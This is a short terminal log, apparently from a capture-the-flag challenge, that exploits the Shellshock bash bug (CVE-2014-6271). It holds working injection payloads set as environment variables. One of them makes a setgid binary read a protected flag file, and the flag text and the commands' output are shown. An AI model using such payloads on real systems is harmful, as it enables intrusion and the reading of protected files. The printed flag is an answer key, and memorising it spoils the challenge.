```
shellshock@pwnable:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
shellshock@pwnable:~$ env x='() { :; }; echo pwnable' bash -c "echo shellshock"
shellshock
shellshock@pwnable:~$ env x='() { :; }; echo pwnable' ./bash -c "echo shellshock"
pwnable
shellshock
shellshock@pwnable:~$ env x='() { :; }; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```